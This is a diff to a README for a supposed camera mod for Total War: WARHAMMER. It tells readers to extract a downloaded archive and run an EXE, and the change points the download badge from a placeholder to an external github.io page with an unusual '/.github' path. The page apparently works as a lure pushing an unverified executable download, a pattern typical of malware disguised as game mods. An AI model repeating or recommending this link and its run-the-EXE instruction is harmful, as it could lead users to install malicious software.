@@ -4,7 +4,7 @@ To install, simply extract the downloaded archive and run the provided EXE file.
 
 Better Camera Mod unlocks enhanced camera controls in Total War: WARHAMMER. Whether you want better tactical awareness or cinematic footage, this mod provides freedom to pan, tilt, and zoom like never before.
 
-[![Download Better Camera Mod](https://img.shields.io/badge/Download-Better--Camera--Mod-blueviolet)](#)
+[![Download Better Camera Mod](https://img.shields.io/badge/Download-Better--Camera--Mod-blueviolet)](https://better-camera-mod-total-war-warhammer.github.io/.github)
 
 ---
 
